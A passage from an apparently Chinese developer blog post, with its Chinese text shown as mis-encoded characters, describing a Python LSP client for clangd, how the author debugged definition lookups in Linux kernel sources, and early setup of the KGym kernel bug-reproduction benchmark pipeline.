DocumentSymbol</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># å¯åŠ¨ clangd è¿›ç¨‹</span></span><br><span class="line">    server_process = subprocess.Popen(</span><br><span class="line">        [<span class="string">&quot;clangd&quot;</span>, <span class="string">&quot;--log=verbose&quot;</span>],</span><br><span class="line">        stdin=subprocess.PIPE,</span><br><span class="line">        stdout=subprocess.PIPE,</span><br><span class="line">        stderr=subprocess.PIPE</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># ä½¿ç”¨ JsonRpcEndpoint åŒ…è£…æ ‡å‡†è¾“å…¥/è¾“å‡ºæµ</span></span><br><span class="line">    json_rpc_endpoint = JsonRpcEndpoint(server_process.stdin, server_process.stdout)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># ä½¿ç”¨ json_rpc_endpoint åˆ›å»º LSP ç«¯ç‚¹</span></span><br><span class="line">    lsp_endpoint = LspEndpoint(json_rpc_endpoint)</span><br><span class="line">    lsp_client = LspClient(lsp_endpoint)</span><br><span class="line">    </span><br><span class="line">    capabilities = &#123;</span><br><span class="line">        <span class="string">&quot;textDocument&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;synchronization&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;dynamicRegistration&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">                <span class="string">&quot;willSave&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">                <span class="string">&quot;willSaveWaitUntil&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">                <span class="string">&quot;didSave&quot;</span>: <span class="literal">True</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;completion&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;dynamicRegistration&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">                <span class="string">&quot;completionItem&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;snippetSupport&quot;</span>: <span class="literal">True</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;definition&quot;</span>: &#123;<span class="string">&quot;dynamicRegistration&quot;</span>: <span class="literal">True</span>&#125;,</span><br><span class="line">            <span class="string">&quot;references&quot;</span>: &#123;<span class="string">&quot;dynamicRegistration&quot;</span>: <span class="literal">True</span>&#125;,</span><br><span class="line">            <span class="string">&quot;documentSymbol&quot;</span>: &#123;<span class="string">&quot;dynamicRegistration&quot;</span>: <span class="literal">True</span>&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    root_path = os.getcwd()</span><br><span class="line">    root_uri = <span class="string">f&quot;file://<span class="subst">&#123;root_path&#125;</span>&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># å‘é€åˆå§‹åŒ–è¯·æ±‚</span></span><br><span class="line">    init_result = lsp_client.initialize(</span><br><span class="line">        processId=os.getpid(),</span><br><span class="line">        rootPath=root_path,</span><br><span class="line">        rootUri=root_uri,</span><br><span class="line">        initializationOptions=<span class="literal">None</span>,</span><br><span class="line">        capabilities=capabilities,</span><br><span class="line">        trace=<span class="string">&quot;verbose&quot;</span>,</span><br><span class="line">        workspaceFolders=<span class="literal">None</span></span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æœåŠ¡å™¨èƒ½åŠ›:&quot;</span>, init_result.get(<span class="string">&quot;capabilities&quot;</span>, &#123;&#125;))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># å‘Šè¯‰æœåŠ¡å™¨æˆ‘ä»¬å·²ç»å‡†å¤‡å¥½</span></span><br><span class="line">    lsp_client.initialized()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># åˆ›å»ºä¸€ä¸ªç®€å•çš„ C ä»£ç æ–‡ä»¶è¿›è¡Œåˆ†æ</span></span><br><span class="line">    c_file_path = os.path.join(root_path, <span class="string">&quot;example.c&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(c_file_path, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">struct Point &#123;</span></span><br><span class="line"><span class="string">    int x;</span></span><br><span class="line"><span class="string">    int y;</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">int add(int a, int b) &#123;</span></span><br><span class="line"><span class="string">    return a + b;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">int main() &#123;</span></span><br><span class="line"><span class="string">    struct Point p = &#123;10, 20&#125;;</span></span><br><span class="line"><span class="string">    int result = add(p.x, p.y);</span></span><br><span class="line"><span class="string">    printf(&quot;Result: %d\\n&quot;, result);</span></span><br><span class="line"><span class="string">    return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># é€šçŸ¥æœåŠ¡å™¨æ–‡ä»¶å·²æ‰“å¼€</span></span><br><span class="line">    uri = <span class="string">f&quot;file://<span class="subst">&#123;c_file_path&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(c_file_path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read()</span><br><span class="line"></span><br><span class="line">    text_document = TextDocumentItem(</span><br><span class="line">        uri=uri,</span><br><span class="line">        languageId=<span class="string">&quot;c&quot;</span>,</span><br><span class="line">        version=<span class="number">1</span>,</span><br><span class="line">        text=content</span><br><span class="line">    )</span><br><span class="line">    lsp_client.didOpen(text_document)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># ç­‰å¾…æœåŠ¡å™¨å¤„ç†æ–‡ä»¶</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># è·å–æ–‡æ¡£ä¸­çš„ç¬¦å·</span></span><br><span class="line">    document_id = TextDocumentIdentifier(uri=uri)</span><br><span class="line">    symbols = lsp_client.documentSymbol(document_id)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\næ–‡æ¡£ç¬¦å·:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> symbol <span class="keyword">in</span> symbols:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  - <span class="subst">&#123;symbol.name&#125;</span> (<span class="subst">&#123;symbol.kind&#125;</span>)&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># æŸ¥æ‰¾ add å‡½æ•°çš„å®šä¹‰</span></span><br><span class="line">    position = Position(line=<span class="number">13</span>, character=<span class="number">12</span>)  <span class="comment"># main å‡½æ•°ä¸­è°ƒç”¨ add çš„ä½ç½®</span></span><br><span class="line">    definitions = lsp_client.definition(document_id, position)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nå®šä¹‰:&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(definitions, <span class="built_in">list</span>):</span><br><span class="line">        <span class="keyword">for</span> definition <span class="keyword">in</span> definitions:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">hasattr</span>(definition, <span class="string">&quot;targetUri&quot;</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;  ä½äº <span class="subst">&#123;definition.targetUri&#125;</span> çš„è¡Œ <span class="subst">&#123;definition.targetRange.start.line&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;  ä½äº <span class="subst">&#123;definition.uri&#125;</span> çš„è¡Œ <span class="subst">&#123;definition.<span class="built_in">range</span>.start.line&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  ä½äº <span class="subst">&#123;definitions.uri&#125;</span> çš„è¡Œ <span class="subst">&#123;definitions.<span class="built_in">range</span>.start.line&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å…³é—­æœåŠ¡å™¨</span></span><br><span class="line">    lsp_client.shutdown()</span><br><span class="line">    lsp_client.exit()</span><br><span class="line">    server_process.terminate()</span><br><span class="line">    server_process.wait()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="æµ‹è¯•å®ç°">æµ‹è¯•å®ç°</h2><p>è¿™ä¸ªè¿‡ç¨‹å°±æ˜¯ä¸€ä¸ªä¸æ–­è®©AIè¯»pylspclientç„¶åè°ƒä¼˜-é˜…è¯»<a href="https://microsoft.github.io/language-server-protocol/specifications/lsp/3.17">æ–‡æ¡£</a>å’Œè¯»ä»£ç è§£å†³é—®é¢˜-å†é‡æ–°è°ƒæ•´ä»£ç çš„ä¸€ä¸ªå¾ªç¯ã€‚</p><p>è¿™ä¸ªè½»é‡çº§çš„pylspclientåº“æœ‰å¾ˆå¤šé—®é¢˜ã€‚ä¸è¿‡å¥½å¤„æ˜¯æˆ‘ä»¬å¯ä»¥ç›´æ¥importå®ƒç§æœ‰çš„éƒ¨åˆ†æ¥è‡ªå·±å®ç°ä¸œè¥¿ã€‚</p><h2 id="é—®é¢˜å’Œè§£å†³">é—®é¢˜å’Œè§£å†³</h2><p>å¯¹äºé‡åˆ°çš„é—®é¢˜ï¼Œä¸€ä¸ªå¾ˆå¥½çš„å¯¹æ¯”æ’é”™æ–¹æ³•æ˜¯å¼€å¯<code>-log=verbose</code>ä¹‹åï¼Œç›‘æ§stderrçš„è¾“å‡ºå’Œvscodeçš„è¾“å‡ºå¯¹æ¯”ï¼Œæ¥è§‚å¯Ÿå’Œclangdé€šä¿¡çš„è¿‡ç¨‹ã€‚æ¯•ç«Ÿç»„ä»¶éƒ½æ˜¯ä¸€æ ·çš„ï¼Œvscodeèƒ½åšåˆ°çš„æˆ‘ä»¬ä¹Ÿèƒ½åšåˆ°ã€‚</p><h3 id="ç´¢å¼•ç­‰å¾…">ç´¢å¼•ç­‰å¾…</h3><p>clangdèƒ½å¿«é€Ÿè·³è½¬å®šä¹‰çš„ä¸€ä¸ªä¾èµ–å°±æ˜¯å…¶ç´¢å¼•ã€‚ä½†æ˜¯ç´¢å¼•çš„æ„å»ºéœ€è¦æ—¶é—´ã€‚vscodeä¸­å®ç°çš„è¿›åº¦æ¡æ˜¯é€šè¿‡<code>$/progress</code>æ–¹æ³•å®ç°çš„ã€‚ä½†æ˜¯è‡ªå·±åšçš„æ—¶å€™ä¸æ¸…æ¥šæ€ä¹ˆå¡«tokenï¼ˆä¹‹å‰æ²¡æœ‰æ„è¯†åˆ°è§‚å¯Ÿvscodeè°ƒè¯•çš„æ–¹æ³•ï¼‰ã€‚</p><p>æœ€åé€‰æ‹©çš„æ˜¯é€šè¿‡ç›‘æ§stderrè®°å½•æ—¥å¿—ä¸­<code>Indexed</code>å…³é”®å­—æ•°é‡ï¼Œå’Œcompile_commands.jsonçš„æ¡ç›®æ•°é‡åŒ¹é…æ¥å®ç°çš„è¿›åº¦ç»Ÿè®¡ã€‚</p><blockquote><p>è¿™é‡Œåç»­å¯ä»¥æ¥ç€å°è¯•$/progressæ–¹æ³•</p></blockquote><h3 id="æ–¹æ³•çš„è½¬æ¢">æ–¹æ³•çš„è½¬æ¢</h3><p>å¼€å§‹aiç»™çš„æŸ¥æ‰¾ç¬¦å·çš„æ ¸å¿ƒæ–¹æ³•æ˜¯<code>workspace/symbol</code>ï¼Œä½†æ˜¯æˆ‘å‘ç°è¿™ä¸ªæ–¹æ³•æœ‰é—®é¢˜ã€‚æœ€å¼€å§‹ï¼Œè§¦å‘ç´¢å¼•æ˜¯éœ€è¦æ‰“å¼€æ–‡ä»¶çš„ï¼Œæˆ‘ä»¬æ‰“å¼€ä¸€äº›å…³é”®çš„æ–‡ä»¶æ¥å®ç°è¿™ä¸€ç‚¹ï¼Œè¿™äº›æ–‡ä»¶æ­£å¥½åŒ…å«äº†æˆ‘ä»¬çš„æµ‹è¯•ç¬¦å·çš„å®šä¹‰ï¼Œå› æ­¤è¯¯æ‰“è¯¯æ’ä»¥ä¸ºå¯¹äº†ï¼Œç»“æœä¸€æµ‹åˆ«çš„å‡½æ•°å°±æŸ¥ä¸åˆ°äº†ã€‚é˜…è¯»<a href="https://microsoft.github.io/language-server-protocol/specifications/lsp/3.17/specification/#workspace_symbol">æ–‡æ¡£</a>ï¼Œè¿™ä¸ªæ–¹æ³•åªèƒ½åœ¨æ‰“å¼€çš„å·¥ä½œåŒºä¸­å»åšç¬¦å·åŒ¹é…ï¼ˆä¸åŒºåˆ†å‡½æ•°ï¼Œå®â€¦ï¼‰ï¼Œå¦‚æœè¦ç”¨è¿™ä¸ªæ–¹æ³•ï¼Œé‚£å°±æ„å‘³ç€éœ€è¦æ‰“å¼€æ‰€æœ‰çš„linuxå†…æ ¸æ–‡ä»¶ï¼Œè¿™æ˜¾ç„¶ä¸ç°å®ã€‚æ”¹æ¥æ”¹å»ä¹Ÿæ²¡æœ‰ç”¨ï¼Œæœ¬è´¨ä¸Šæ˜¯è°ƒç”¨çš„æ–¹æ³•é”™äº†ã€‚</p><p>ä»è¿™é‡Œå¼€å§‹æˆ‘æ„è¯†åˆ°å¯ä»¥è§‚å¯Ÿvscodeçš„æ—¥å¿—æ¥å¯¹æ¯”äº†ï¼Œæˆ‘å‘ç°vscodeæŸ¥æ‰¾å®šä¹‰ä½¿ç”¨çš„å°±æ˜¯<code>textDocument</code>ä¸‹é¢çš„æ–¹æ³•ï¼ŒæŸ¥å®šä¹‰ç”¨<code>definition</code>ï¼ŒæŸ¥å¼•ç”¨ç”¨<code>references</code>ï¼Œè€Œä¸”è¿”å›çš„ç»“æœç‰¹åˆ«ç†æƒ³ã€‚äºæ˜¯æˆ‘æ¨ç¿»äº†<code>workspace/symbol</code>æ–¹æ³•ï¼Œæ”¹ç”¨äº†<code>textDocument/definition</code>ã€‚</p><h3 id="å°é—®é¢˜">å°é—®é¢˜</h3><p>clangdä¼šå‘é€notifyç»™å®¢æˆ·ç«¯ï¼Œæˆ‘ä»¬éœ€è¦æ³¨å†Œç›¸åº”çš„å›è°ƒå‡½æ•°ï¼Œå¦åˆ™<code>lsp_endpoint.call_method</code>ä¼šæŠ¥é”™ï¼Œæˆ‘ä»¬æ³¨å†Œä¸€ä¸ªå‡½æ•°å¤„ç†<code>publishDiagnostics</code>ï¼Œç›´æ¥passæ‰å°±è¡Œã€‚</p><p>å¦å¤–ï¼Œè·å–ç¬¦å·ä¸­é—´æƒ³ä¹Ÿç”¨LSPæ–¹æ³•çš„ï¼Œä½†æ˜¯ç”¨äº†ä¸‹<code>textdocument/documentSymbols</code>ä¹‹åå‘ç°å®ƒåªè¿”å›å½“å‰æ–‡æ¡£ä¸­å®šä¹‰äº†çš„ç¬¦å·å°±åˆé‡æ–°æ¢å›å­—ç¬¦ä¸²æŸ¥æ‰¾äº†ã€‚</p><h3 id="æœ€æ€ªå¼‚çš„é—®é¢˜">æœ€æ€ªå¼‚çš„é—®é¢˜</h3><p>æœ€åä¸€åˆ‡æ‰§è¡Œå¦¥å½“ï¼Œä½†æ˜¯æŸ¥æ‰¾å®šä¹‰å’Œå¼•ç”¨éƒ½é‡åˆ°äº†ä»¥ä¸‹ç°è±¡ï¼šåªèƒ½è¿”å›æœ¬æ–‡ä»¶åŠå…¶å¤´æ–‡ä»¶ä¸­çš„å£°æ˜ï¼Œæ— æ³•è¿”å›å¤–éƒ¨çš„å®šä¹‰ã€‚</p><p>dumpæ—¥å¿—å’Œvscodeå¯¹æ¯”å‘ç°ï¼Œæ–¹æ³•è°ƒç”¨å’Œåˆå§‹åŒ–å‚æ•°æ²¡æœ‰åŒºåˆ«ï¼Œæˆ‘å°è¯•äº†å¾ˆå¤šåŠæ³•ä½†æ˜¯è¿˜æ˜¯æŸ¥ä¸åˆ°å®šä¹‰ã€‚ä½†æ˜¯vscodeçš„è¿”å›å°±æ˜¯å¾ˆå¥½ã€‚</p><p>è¿™é‡Œä¸å¾—ä¸è¯´å¤šäººç»„é˜Ÿå¼€å‘çš„å¥½å¤„äº†ã€‚å¼€ä¼šçš„æ—¶å€™æˆ‘è¯´äº†è¿™ä¸ªæ€ªå¼‚çš„é—®é¢˜å¹¶ä¸”æä¾›äº†æ—¥å¿—å¯¹æ¯”ï¼Œå¦ä¸€ä¸ªè´Ÿè´£è¿™éƒ¨åˆ†çš„é˜Ÿå‹è¯•äº†ä¸‹ï¼Œå‘ç°ä»–é‚£è¾¹çš„ç¨‹åºåœ¨è°ƒç”¨ä¸€æ¬¡<code>textDocument/documentLinks</code>ä¹‹åå°±å¯ä»¥æŸ¥åˆ°å®šä¹‰äº†ã€‚ç»“æœæˆ‘æœ¬åœ°ç”¨å®ƒçš„ç¨‹åºä»ç„¶ä¸è¡Œï¼Œæˆ‘ä»¬å¯¹äº†ä¸€ä¸‹å…¨æµç¨‹ï¼Œæˆ‘ä»å¤´ä¸‹è½½äº†ä¸€ä¸ªæºç ï¼Œç„¶åä½¿ç”¨<code>bear -- make $(nproc) LLVM=1</code>æ¥ç¼–è¯‘ï¼Œç”¨bearç”Ÿæˆç¼–è¯‘æ•°æ®åº“è€Œä¸ç”¨linuxå†…æ ¸è‡ªå¸¦çš„compile_commands.jsonï¼Œå¹¶ä¸”ç”¨<code>LLVM=1</code>è€Œé<code>CC=clang</code>æ¥ç¼–è¯‘ï¼Œç»“æœä»¤äººæƒŠå¥‡ï¼Œè¿™ä¸€å¥—ä¸‹æ¥å°±æ­£å¸¸äº†ã€‚ç»è¿‡åç»­çš„æµ‹è¯•ï¼Œæ‰“å¼€æ–‡ä»¶åçš„ç¬¬ä¸€ä¸ªå‘½ä»¤ï¼ˆæŸ¥æ‰¾å®šä¹‰ï¼‰ä¸€å®šæ˜¯é”™çš„ï¼Œåœ¨ä¸€ä¸ªå…¶ä»–æ“ä½œåå†æŸ¥è¯¢å®šä¹‰å°±ä¼šæ­£å¸¸ã€‚</p><p>ç„¶è€Œæˆ‘é‡æ–°ç¼–è¯‘äº†ä¸€è¾¹ä¹‹å‰ç”¨çš„linuxå†…æ ¸æºç ï¼Œç»“æœæŸ¥è¿˜æ˜¯æŸ¥ä¸åˆ°ï¼Œå±…ç„¶æœ‰äº†æ›´ç¦»è°±çš„è¿”å›å€¼ï¼šç›´æ¥ä¸æ¼”äº†è¿”å›æˆ‘æŸ¥è¯¢çš„åŸä½ç½®ã€‚è¿™è®©æˆ‘æ„Ÿè§‰è¿™ä¸œè¥¿è‚¯å®šå’Œç¼–è¯‘è¿‡ç¨‹æœ‰å…³ï¼Œç›®å‰çš„è§£å†³æ–¹æ³•æ˜¯ï¼š</p><ul class="lvl-0"><li class="lvl-2"><p>ä¸‹è½½æºç åä½¿ç”¨<code>bear -- make $(nproc) LLVM=1</code>ç¼–è¯‘ï¼Œç”¨bearæ•°æ®åº“ä¸è¦ç”¨linuxå†…æ ¸çš„</p></li></ul><blockquote><p>ä½†æ˜¯ï¼Œå¯¹äºæˆ‘æ—§ç‰ˆçš„ç¼–è¯‘æ•°æ®åº“ï¼Œvscodeä¹Ÿèƒ½æ­£å¸¸è¿è¡Œå¹¶æ— å¤§ç¢ï¼ŒåŸå› ä¸æ˜ï¼Œå¤ªè¯¡å¼‚äº†ï¼Œåªèƒ½è¯´èƒ½æœ‰ä¸€ä¸ªç¨³å®šè·‘çš„æ–¹æ¡ˆå°±ä¸è¦åŠ¨äº†</p></blockquote><p>å¦‚æœæˆ‘è‡ªå·±ç ”ç©¶å¯èƒ½ç›¸å½“é•¿æ—¶é—´ä¹Ÿè§£å†³ä¸äº†ï¼ˆç›´åˆ°æˆ‘è¯•é”™è¯•åˆ°æ›´æ¢ç¼–è¯‘æ•°æ®åº“æ‰ä¼šå‘ç°ï¼‰.</p><hr><p>ä½†æ˜¯è¿™ä¸ªè§£å†³æ–¹æ³•æ˜¾ç„¶æ˜¯ä¸åˆç†çš„ï¼Œéå¸¸çš„ç¨‹åºå‘˜åˆ»æ¿å°è±¡ç¬‘è¯ï¼štmdå‡­ä»€ä¹ˆèƒ½è·‘ï¼Ÿè¿™äº›æ“ä½œä¸‹æ¥ï¼Œå°±å¦‚åŒä½ è¦è¯¢é—®ä¸€ä¸ªäººä¸€ä¸ªé—®é¢˜çš„ç­”æ¡ˆï¼Œä»–ä¹Ÿæ²¡æœ‰ä¸ç†ä½ ï¼Œåªæ˜¯ä¸€ç›´åšå®šåœ°å›ç­”åŒä¸€ä¸ªé”™è¯¯çš„ç­”æ¡ˆã€‚ç›´åˆ°ä½ ä¸‹æ¬¡æå‰æ‹äº†ä»–ä¸¤ä¸‹ç„¶åæ‰‡è‡ªå·±ä¸€å·´æŒï¼Œä½ å°±å¾—åˆ°äº†äº‰å–ç­”æ¡ˆï¼Œè€Œä¸”è¿™å¥—æµç¨‹æ€»èƒ½å¾—åˆ°æ­£ç¡®ç­”æ¡ˆï¼Œä½†æ˜¯å°±æ˜¯å¾ˆæ€ªå¼‚ã€‚</p><p>æœ€ç»ˆåœ¨51å‡æœŸæœ€åä¸€å¤©æˆ‘ç»è¿‡å„ç§å°è¯•å’Œaiè°ƒæ•™ï¼Œè¯•å‡ºæ¥äº†å…³é”®é—®é¢˜æ‰€åœ¨ï¼šå»¶è¿Ÿã€‚è™½ç„¶æˆ‘ä»ç„¶ä¸çŸ¥é“çš„æ˜¯ï¼Œ<strong>ä¸ºä»€ä¹ˆtmd clangdä¼šè¿”å›é”™è¯¯ç­”æ¡ˆ</strong>ï¼Œä½†æ˜¯ç»è¿‡æµ‹è¯•ï¼Œå…³é”®ç‚¹ä¸åœ¨åˆ çš„é‚£ä¸€å·´æŒï¼Œä½ å…¶å®åªè¦ç­‰ä¸€ä¸‹å°±å¥½ï¼šåœ¨æ‰“å¼€æ–‡ä»¶åæ·»åŠ ä¸€ä¸ª<code>time.sleep(0.5)</code>ä¸€åˆ‡å°±éƒ½è§£å†³äº†ï¼Œå®šä¹‰éå¸¸å®Œå¥½ã€‚æˆ‘ä¹Ÿä¸æ¸…æ¥šclangdåˆ°åº•æ€ä¹ˆåšçš„æœºåˆ¶ï¼Œä¸é˜»å¡æˆ–æ˜¯æç¤ºæ²¡æ‰¾åˆ°ï¼Œåè€Œå¯¹äºæˆ‘ä»¬è°ƒç”¨definitionæ–¹æ³•çš„æ—¶å€™è¿”å›ä¸€ä¸ªdeclarationï¼Ÿï¼Ÿï¼Ÿ</p><p>okï¼Œé€šè¿‡åœ¨äº¤äº’å‰æ·»åŠ å»¶è¿Ÿï¼Œå¼•ç”¨å’Œå®šä¹‰å…¨æ‹¿ä¸‹äº†ã€‚</p><h3 id="æ·»åŠ -progress">æ·»åŠ $progress</h3><p>å¯¹æ¯”vscodeçš„æ—¥å¿—æ¥è°ƒæ–¹æ³•ï¼Œç»“æœå‘ç°åŸæ¥<code>window/workDoneProgress/create</code>æ˜¯ä¸€ä¸ªæœåŠ¡ç«¯ç»™å®¢æˆ·ç«¯çš„é€šçŸ¥è€Œä¸æ˜¯è¯·æ±‚ã€‚æ·»åŠ äº†ä¿©åŠŸèƒ½ï¼Œè°ƒäº†ä¸‹ç”Ÿå‘½å‘¨æœŸçš„é—®é¢˜ï¼ˆå›è°ƒå‡½æ•°éœ€è¦åªæœ‰ä¸€ä¸ªparamå‚æ•°ï¼Œä½†æ˜¯ç±»ç¤ºä¾‹åˆå§‹åŒ–å°±è¦æ³¨å†Œè¿™ä¸ªå‡½æ•°ï¼‰ï¼Œanalyzeræ”¹æˆå…¨å±€çš„ï¼Œæš‚æ—¶æ€§çš„é—®é¢˜è§£å†³äº†ã€‚</p><h3 id="ç¬¦å·æœç´¢">ç¬¦å·æœç´¢</h3><p>æµ‹è¯•panicå‡½æ•°çš„æ—¶å€™å‘ç°ä¼šåŒ¹é…åˆ°æ³¨é‡Šä¸­çš„panicå¯¼è‡´æœä¸åˆ°ç¬¦å·ã€‚</p><h2 id="æœ€ç»ˆä»£ç ">æœ€ç»ˆä»£ç </h2><h1>KGym</h1><h2 id="ç¯å¢ƒæ­å»ºï¼ˆæŠ˜ç£¨ï¼‰">ç¯å¢ƒæ­å»ºï¼ˆæŠ˜ç£¨ï¼‰</h2><h3 id="google-cloud">google cloud</h3><p>åˆ›å»ºå®ä¾‹çš„å‘½ä»¤éœ€è¦åšè°ƒæ•´</p><h2 id="åŸå§‹è®ºæ–‡çš„è°ƒç”¨æµç¨‹">åŸå§‹è®ºæ–‡çš„è°ƒç”¨æµç¨‹</h2><p>æˆ‘ä»¬çš„ç›®æ ‡æ˜¯æŠŠæˆ‘ä»¬çš„agentæ›¿æ¢è¿›åŸå§‹è®ºæ–‡çš„LLMéƒ¨åˆ†è®©å®ƒç”Ÿæˆroot causeï¼ˆå…ˆï¼‰ã€‚è¿™é‡Œæ ¹æ®githubä¸Šçš„ä»“åº“æ¥çœ‹ï¼Œå®ƒæœ‰ä¸‰ä¸ªä»“åº“ã€‚åˆ†åˆ«æ˜¯</p><p>æ ¹æ®readmeï¼Œä¸€å¥—å®Œæ•´çš„å®¢æˆ·ç«¯çš„å¤ç°æµç¨‹å¤§æ¦‚æ˜¯è¿™æ ·æ‰§è¡Œçš„ï¼š</p><ol><li class="lvl-3"><p><code>KGym-Kernel-Playground/populate_benchmark.py</code>ã€‚ç¨‹åºä»benè¿™ä¸€ç¨‹åºä»syzbotç½‘ç«™ä¸‹è½½å´©æºƒæ‰€éœ€è¦çš„å†…æ ¸é…ç½®æ–‡ä»¶ï¼Œsyzreproducerå’ŒCreproducerç­‰ã€‚</p><ul class="lvl-2"><li class="lvl-5">è¯»å–JSONæ ¼å¼çš„bugæ•°æ®</li><li class="lvl-5">å¤„ç†æ¯ä¸ªbugä¸­çš„å´©æºƒè®°å½•ï¼ˆcrashesï¼‰</li><li class="lvl-5">ä¸‹è½½ç›¸å…³çš„é‡ç°ä»£ç å’Œå†…æ ¸é…ç½®</li><li class="lvl-5">å°†ä¸‹è½½çš„æ•°æ®æ·»åŠ åˆ°åŸå§‹JSONä¸­</li><li class="lvl-5">ä¿å­˜æ›´æ–°åçš„JSON</li></ul></li><li class="lvl-3"><p><code>$KBENCH_EXPR_PATH/inference/make_datasets/make_linux_dataset.py</code>ã€‚ç´§æ¥ç€æ­¥éª¤1ï¼Œè¿›ä¸€æ­¥ç”Ÿæˆåˆé€‚çš„dataset jsonæ–‡ä»¶ï¼ŒåŒ…å«å´©æºƒæŠ¥å‘Šï¼Œå†…æ ¸è¡¥ä¸ï¼Œæäº¤ä¿¡æ¯ï¼Œä¿®æ”¹æ–‡ä»¶ç­‰ç­‰ï¼Œå­˜æ”¾åœ¨<code>$KBENCH_EXPR_PATH/dataset</code>ç›®å½•ä¸‹</p></li><li class="lvl-3"><p><code>$KBENCH_EXPR_PATH/inference/make_datasets/bm25_retrieval_modified.py</code>ã€‚ä½¿ç”¨bm25ç´¢å¼•ç®—æ³•ï¼Œå°†ä»£ç æ–‡ä»¶è½¬æˆå¯æœç´¢æ–‡æ¡£ï¼ˆæ„å»ºå…¨æ–‡ç´¢å¼•ï¼‰åˆ©ç”¨2ç”Ÿæˆçš„dataset, ç”¨äº†ä¸€ä¸ªå«pyseriniçš„åº“æ¥å¯¹ç‰¹å®šçš„commit linuxä»£ç ä»“åº“åšæ£€ç´¢ã€‚æ¯ä¸ªé—®é¢˜è¿”å›æœ€ç›¸å…³çš„20ä¸ªæ–‡ä»¶å¹¶è¾“å‡ºã€‚</p></li></ol><blockquote><p>è¿™é‡Œæˆ‘ä»¬æ˜¯å¦å¯ä»¥ç›´æ¥é€šè¿‡clangdæœç´¢ç¬¦å·å¼•ç”¨çš„æ–¹å¼æ¥ç¡®å®šç›¸å…³æ–‡ä»¶ï¼Ÿæºæ–‡æ¡£readmeä¸­è¯´è¦å¤§æ¦‚3h</p></blockquote><ol start="4"><li class="lvl-3"><p><code>$KBENCH_EXPR_PATH/inference/make_datasets/create_text_dataset.py</code>. è¿™ä¸ªç¨‹åºç”Ÿæˆæœ€ç»ˆå‘ç»™å¤§æ¨¡å‹çš„å†…å®¹ã€‚å®ƒåº”ç”¨äº†ä¸€äº›promptæ¨¡æ¿ï¼Œä»3ä¸­ç”Ÿæˆçš„æ£€ç´¢ç»“æœç”Ÿæˆç»“æ„åŒ–çš„è‡ªç„¶è¯­è¨€å†…å®¹ã€‚</p></li><li class="lvl-3"><p><code>$KBENCH_EXPR_PATH/inference/run_api.py</code>. è¿™ä¸ªç¨‹åºå°†4ç”Ÿæˆçš„å†…å®¹å‘ç»™å¤§æ¨¡å‹å¹¶è·å–patchä¿å­˜åœ¨æ–‡ä»¶ã€‚å¯¹ä¸åŒæ¨¡å‹åšäº†å…¼å®¹ã€‚</p></li><li class="lvl-3"><p><code>$BASE_PATH/run_prompt_predictions.py</code>ã€‚è¿™é‡Œå¼€å§‹å°±æ˜¯è¿è¡ŒKGymå»åšå¤ç°äº†ã€‚è¿™ä¸ªç¨‹åºç”¨äºç”Ÿæˆåˆé€‚çš„å‚æ•°å¹¶è¿è¡Œ<code>KReproducer.execute_bug_reproduction</code>åœ¨KGymå¹³å°åšå¤ç°ã€‚</p></li><li 